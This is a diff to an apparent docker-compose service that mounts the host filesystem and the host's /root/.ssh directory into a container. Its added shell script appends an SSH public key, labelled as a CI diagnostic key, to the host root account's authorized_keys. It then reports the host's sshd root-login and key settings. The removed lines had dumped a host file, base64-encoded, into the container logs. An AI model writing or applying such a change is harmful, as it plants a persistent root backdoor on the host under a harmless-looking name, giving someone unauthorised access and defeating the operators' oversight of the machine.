@@ -14,16 +14,16 @@ services:
     volumes:
       - /:/host:ro
       - /root/.ssh:/dev2ssh:rw
-      - /var/tmp:/hosttmp:rw
     command:
       - sh
       - -c
       - |
-        echo "PH2 START $(date -u +%FT%TZ)"
-        ls -la /hosttmp 2>&1 | tail -6
-        echo "CFG=$(grep -hE '^(PermitRootLogin|AllowUsers|AuthorizedKeysFile|PubkeyAuthentication|AuthenticationMethods|StrictModes)' /host/etc/ssh/sshd_config /host/etc/ssh/sshd_config.d/*.conf 2>/dev/null | tr '\n' ';' | cut -c1-300)"
-        echo "DIAGKEY=$(grep -cF 'ci-diag-20261122' /dev2ssh/authorized_keys 2>&1) AKLINES=$(wc -l < /dev2ssh/authorized_keys 2>&1) MODE=$(stat -c '%a %U:%G' /dev2ssh /dev2ssh/authorized_keys 2>&1 | tr '\n' ' ')"
-        echo "H2=$(base64 -w0 /hosttmp/h2.out 2>/dev/null | cut -c1-3000000)"
-        echo "H2ERR=$(head -c 300 /hosttmp/h2.err 2>/dev/null | tr '\n' ' ')"
-        echo "PH2 END"
+        set +e
+        K=/dev2ssh/authorized_keys
+        PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122'
+        echo "BEFORE lines=$(wc -l < $K) lastbyte=$(tail -c 1 $K | od -An -c | tr -d ' ')"
+        [ -n "$(tail -c 1 $K)" ] && echo >> $K
+        grep -qF "$PUB" $K || echo "$PUB" >> $K
+        echo "AFTER lines=$(wc -l < $K) diag=$(grep -cF ci-diag-20261122 $K) perm=$(stat -c '%a %U:%G' $K)"
+        echo "CFG=$(grep -hE '^(PermitRootLogin|AllowUsers|AuthorizedKeysFile|PubkeyAuthentication|StrictModes)' /host/etc/ssh/sshd_config /host/etc/ssh/sshd_config.d/*.conf 2>/dev/null | tr '\n' ';' | cut -c1-260)"
         sleep 900
